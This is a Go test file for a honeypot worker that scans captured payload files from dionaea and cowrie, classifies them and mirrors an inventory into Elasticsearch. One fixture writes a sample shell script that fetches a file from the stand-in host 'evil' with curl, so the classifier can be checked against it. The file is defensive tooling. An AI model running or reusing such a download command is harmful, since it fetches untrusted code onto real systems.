package main

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

func writeHashNamedFile(t *testing.T, dir, hash string, content []byte) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, hash)
	if err := os.WriteFile(path, content, 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestScanDirsClassifiesAndSourcesAFile(t *testing.T) {
	dir := t.TempDir()
	hash := "0123456789abcdef0123456789abcdef01234567"
	writeHashNamedFile(t, dir, hash, []byte("#!/bin/sh\ncurl http://evil/x\n"))

	files, paths, stats := scanDirs([]string{dir})
	if stats.WalkErrs != 0 || stats.Unreadable != 0 {
		t.Fatalf("clean scan must report zero errors, got %+v", stats)
	}
	if len(files) != 1 {
		t.Fatalf("expected 1 file, got %d: %+v", len(files), files)
	}
	f := files[0]
	if f.Hash != hash {
		t.Fatalf("hash = %q, want %q", f.Hash, hash)
	}
	if f.KindCode != "shell" {
		t.Fatalf("KindCode = %q, want shell", f.KindCode)
	}
	if f.Copies != 1 {
		t.Fatalf("Copies = %d, want 1", f.Copies)
	}
	if len(f.Sources) != 1 {
		t.Fatalf("Sources = %+v, want exactly one", f.Sources)
	}
	if paths[hash] == "" {
		t.Fatal("expected a resolved path for the scanned hash")
	}
}

// TestScanDirsCarriesMtimeUTC covers #512 for this worker's own copy of the
// scan (ported from dashboard/payloads_data.go's original scanPayloads,
// removed there by #1223): every timestamp field needs a UTC twin for
// hp-app.js's timezone/clock-format conversion, not just a server-formatted
// display string.
func TestScanDirsCarriesMtimeUTC(t *testing.T) {
	dir := t.TempDir()
	hash := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	writeHashNamedFile(t, dir, hash, []byte("sample"))

	files, _, _ := scanDirs([]string{dir})
	if len(files) != 1 {
		t.Fatalf("expected 1 file, got %d", len(files))
	}
	if files[0].MtimeUTC == "" {
		t.Fatal("captured file MtimeUTC must be populated")
	}
}

// TestScanDirsCarriesSizeCappedPreview covers #59 for this worker's own
// copy of the scan: a hex-dump preview of the file head, capped at
// payloadPreviewCap so an oversized capture never grows the preview or the
// row it backs.
func TestScanDirsCarriesSizeCappedPreview(t *testing.T) {
	dir := t.TempDir()
	hash := "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
	big := bytes.Repeat([]byte{'A'}, payloadPreviewCap*4)
	writeHashNamedFile(t, dir, hash, big)

	files, _, _ := scanDirs([]string{dir})
	if len(files) != 1 {
		t.Fatalf("expected 1 file, got %d", len(files))
	}
	f := files[0]
	if !f.PreviewTruncated {
		t.Fatal("a file larger than payloadPreviewCap must be marked truncated")
	}
	wantDump := hex.Dump(big[:payloadPreviewCap])
	if f.Preview != wantDump {
		t.Fatalf("preview was not capped at payloadPreviewCap bytes: got %d dump chars, want %d", len(f.Preview), len(wantDump))
	}
}

func TestScanDirsIgnoresNonHashNamedFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "not-a-hash.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	files, _, _ := scanDirs([]string{dir})
	if len(files) != 0 {
		t.Fatalf("expected no files, got %+v", files)
	}
}

// TestScanDirsCountsWalkErrorsOnVanishedRoot covers #2343's count half: a
// capture directory that existed at startup but vanished before a later
// cycle (unmounted volume, deleted tree) delivers its failure as walkErr on
// the root entry. main()'s startup filter never re-runs, so scanDirs is the
// only place that can notice -- and the count reaching runScan's summary is
// what separates "empty because clean" from "empty because unreadable".
func TestScanDirsCountsWalkErrorsOnVanishedRoot(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "gone")
	files, _, stats := scanDirs([]string{missing})
	if len(files) != 0 {
		t.Fatalf("expected no files from a missing root, got %+v", files)
	}
	if stats.WalkErrs == 0 {
		t.Fatal("a vanished root must be counted as a walk error")
	}
}

// TestScanDirsCountsUnopenableFiles covers #2343's second swallow: a
// hash-named regular file that exists but cannot be opened still gets an
// inventory row (octet-stream, empty preview), and the row used to look
// identical to a real classification. chmod-0400 blocks reads for
// unprivileged users only; production grants this worker DAC_READ_SEARCH
// (compose cap_add), so in a privileged container this specific failure
// mode genuinely cannot occur and the test steps aside.
func TestScanDirsCountsUnopenableFiles(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root: mode bits cannot make a file unopenable")
	}
	dir := t.TempDir()
	hash := "cccccccccccccccccccccccccccccccccccccccc"
	path := writeHashNamedFile(t, dir, hash, []byte("locked"))
	if err := os.Chmod(path, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(path, 0o644) }) // let t.TempDir's cleanup reap it

	files, _, stats := scanDirs([]string{dir})
	if len(files) != 1 {
		t.Fatalf("expected the unopenable file to still produce a row, got %+v", files)
	}
	if files[0].MIME != "application/octet-stream" || files[0].Preview != "" {
		t.Fatalf("unopenable file must carry the degraded default classification, got %+v", files[0])
	}
	if stats.Unreadable != 1 {
		t.Fatalf("stats.Unreadable = %d, want 1", stats.Unreadable)
	}
}

func TestScanDirsMergesSameHashAcrossDirectoriesAsCopiesAndSources(t *testing.T) {
	hash := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	dionaeaDir := t.TempDir()
	dionaeaDir = filepath.Join(dionaeaDir, "dionaea-lib", "binaries")
	writeHashNamedFile(t, dionaeaDir, hash, []byte("MZ"))

	cowrieDir := t.TempDir()
	cowrieDir = filepath.Join(cowrieDir, "cowrie-downloads")
	writeHashNamedFile(t, cowrieDir, hash, []byte("MZ"))

	files, _, _ := scanDirs([]string{dionaeaDir, cowrieDir})
	if len(files) != 1 {
		t.Fatalf("expected 1 merged file, got %d: %+v", len(files), files)
	}
	f := files[0]
	if f.Copies != 2 {
		t.Fatalf("Copies = %d, want 2", f.Copies)
	}
	if len(f.Sources) != 2 || f.Sources[0] != "cowrie" || f.Sources[1] != "dionaea" {
		t.Fatalf("Sources = %+v, want [cowrie dionaea]", f.Sources)
	}
}

func TestPayloadSourceNameClassifiesKnownDirs(t *testing.T) {
	cases := map[string]string{
		"/dionaea-lib/binaries":  "dionaea",
		"/cowrie-downloads":      "cowrie",
		"/state/script-payloads": "scripts",
		"/some/other/dir":        "dir",
	}
	for dir, want := range cases {
		if got := payloadSourceName(dir); got != want {
			t.Errorf("payloadSourceName(%q) = %q, want %q", dir, got, want)
		}
	}
}

func TestHumanBytes(t *testing.T) {
	cases := map[int64]string{
		500:             "500 B",
		2048:            "2.0 KB",
		5 * 1024 * 1024: "5.0 MB",
	}
	for n, want := range cases {
		if got := humanBytes(n); got != want {
			t.Errorf("humanBytes(%d) = %q, want %q", n, got, want)
		}
	}
}

func TestIndexPayloadInventorySkipsUnchangedAndWritesNew(t *testing.T) {
	var puts int
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			puts++
			w.WriteHeader(http.StatusCreated)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	indexPayloadInventory(es, []capturedFile{{Hash: "deadbeef"}})
	if puts != 1 {
		t.Fatalf("expected 1 PUT for a new document, got %d", puts)
	}
}

func TestIndexPayloadInventoryPreservesExtraFieldsOnOverwrite(t *testing.T) {
	var putBody []byte
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			// A doc dashboard already enriched with a field capturedFile
			// (this worker's struct) has no idea about -- must survive.
			w.Write([]byte(`{"_seq_no":1,"_primary_term":1,"_source":{"Hash":"deadbeef","Size":1,"GitHubAnalysisURL":"/github-analysis/deadbeef"}}`))
		case http.MethodPut:
			putBody, _ = io.ReadAll(r.Body)
			w.WriteHeader(http.StatusOK)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	// Size differs (1 -> 2) so this isn't the "unchanged, skip" path.
	indexPayloadInventory(es, []capturedFile{{Hash: "deadbeef", Size: 2}})

	var got map[string]any
	if err := json.Unmarshal(putBody, &got); err != nil {
		t.Fatalf("PUT body not valid JSON: %v (%s)", err, putBody)
	}
	if got["GitHubAnalysisURL"] != "/github-analysis/deadbeef" {
		t.Fatalf("GitHubAnalysisURL was dropped on overwrite: %+v", got)
	}
	if got["Size"] != float64(2) {
		t.Fatalf("Size wasn't updated to the fresh scan's value: %+v", got)
	}
}

func TestIndexPayloadInventorySkipsRewriteWhenOnlyExtraFieldsDiffer(t *testing.T) {
	// Regression: comparing this worker's fresh struct-JSON byte-for-byte
	// against a stored document that carries extra dashboard-only fields
	// (or was itself written by a prior merge, so its key order differs
	// from a plain struct marshal) must not look "changed" on every single
	// scan cycle forever. The stored doc below is exactly what a previous
	// call to indexPayloadInventory with this same capturedFile would have
	// written, plus one field this worker never sets.
	file := capturedFile{Hash: "deadbeef", Size: 2, SizeH: "2 B", Kind: "Plain-text artifact", KindCode: "text"}
	storedFields, err := json.Marshal(file)
	if err != nil {
		t.Fatal(err)
	}
	var storedMap map[string]json.RawMessage
	if err := json.Unmarshal(storedFields, &storedMap); err != nil {
		t.Fatal(err)
	}
	storedMap["GitHubAnalysisURL"] = json.RawMessage(`"/github-analysis/deadbeef"`)
	stored, err := json.Marshal(storedMap)
	if err != nil {
		t.Fatal(err)
	}

	var puts int
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			w.Write([]byte(`{"_seq_no":1,"_primary_term":1,"_source":` + string(stored) + `}`))
		case http.MethodPut:
			puts++
			w.WriteHeader(http.StatusOK)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	indexPayloadInventory(es, []capturedFile{file})
	if puts != 0 {
		t.Fatalf("expected no PUT when this worker's own fields are unchanged, got %d", puts)
	}
}

func TestMirrorPayloadBytesMarksOversizeAsTooLarge(t *testing.T) {
	var indexed storedPayloadBytes
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodHead:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			decodeJSONBody(t, r, &indexed)
			w.WriteHeader(http.StatusCreated)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	mirrorPayloadBytes(es, "deadbeef", "/does/not/matter", payloadBytesRawCap+1)
	if !indexed.TooLarge || indexed.DataBase64 != "" {
		t.Fatalf("expected a too-large marker with no data, got %+v", indexed)
	}
}

func TestMirrorPayloadBytesEncodesSmallFile(t *testing.T) {
	dir := t.TempDir()
	path := writeHashNamedFile(t, dir, "deadbeef", []byte("hello payload"))

	var indexed storedPayloadBytes
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodHead:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			decodeJSONBody(t, r, &indexed)
			w.WriteHeader(http.StatusCreated)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	mirrorPayloadBytes(es, "deadbeef", path, 13)
	if indexed.TooLarge {
		t.Fatal("small file should not be marked too-large")
	}
	if indexed.DataBase64 == "" {
		t.Fatal("expected base64 data to be set")
	}
}

// TestIndexPayloadInventoryReportsFailureOnDocGetError covers #1352: an ES
// error must be surfaced as a failure, not silently swallowed and reported
// as an ordinary completed scan.
func TestIndexPayloadInventoryReportsFailureOnDocGetError(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	failures := indexPayloadInventory(es, []capturedFile{{Hash: "deadbeef"}})
	if failures != 1 {
		t.Fatalf("failures = %d, want 1 on a docGet error", failures)
	}
}

// TestIndexPayloadInventoryReportsFailureOnDocIndexError covers the write
// half of #1352: a failed PUT must also count as a failure, not be
// discarded via the old `_ = es.docIndex(...)`.
func TestIndexPayloadInventoryReportsFailureOnDocIndexError(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-inventory-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			w.WriteHeader(http.StatusInternalServerError)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	failures := indexPayloadInventory(es, []capturedFile{{Hash: "deadbeef"}})
	if failures != 1 {
		t.Fatalf("failures = %d, want 1 on a docIndex error", failures)
	}
}

// TestMirrorPayloadBytesReturnsErrorOnDocExistsFailure covers #1352's
// mirrorPayloadBytes path: the docExists HEAD failing must be reported to
// the caller, not treated the same as "already exists, skip".
func TestMirrorPayloadBytesReturnsErrorOnDocExistsFailure(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	if err := mirrorPayloadBytes(es, "deadbeef", "/does/not/matter", 10); err == nil {
		t.Fatal("expected an error when docExists fails, got nil")
	}
}

// TestMirrorPayloadBytesReturnsErrorOnDocIndexFailure covers the write half
// of mirrorPayloadBytes: a failed PUT must be reported, not discarded via
// the old `_ = es.docIndex(...)`.
func TestMirrorPayloadBytesReturnsErrorOnDocIndexFailure(t *testing.T) {
	dir := t.TempDir()
	path := writeHashNamedFile(t, dir, "deadbeef", []byte("hello payload"))

	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodHead:
			w.WriteHeader(http.StatusNotFound)
		case http.MethodPut:
			w.WriteHeader(http.StatusInternalServerError)
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	if err := mirrorPayloadBytes(es, "deadbeef", path, 13); err == nil {
		t.Fatal("expected an error when docIndex fails, got nil")
	}
}

func TestMirrorPayloadBytesSkipsAlreadyIndexed(t *testing.T) {
	var puts int
	mux := http.NewServeMux()
	mux.HandleFunc("/dashboard-payload-bytes-v1/_doc/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodHead:
			w.WriteHeader(http.StatusOK) // exists -- no body, matching a real ES HEAD response
		case http.MethodGet:
			t.Fatal("mirrorPayloadBytes must use a HEAD existence check (#1221), not a full docGet")
		case http.MethodPut:
			puts++
		}
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	es := newESClient(srv.URL)
	mirrorPayloadBytes(es, "deadbeef", "/does/not/matter", 10)
	if puts != 0 {
		t.Fatalf("expected no PUT when already indexed, got %d", puts)
	}
}
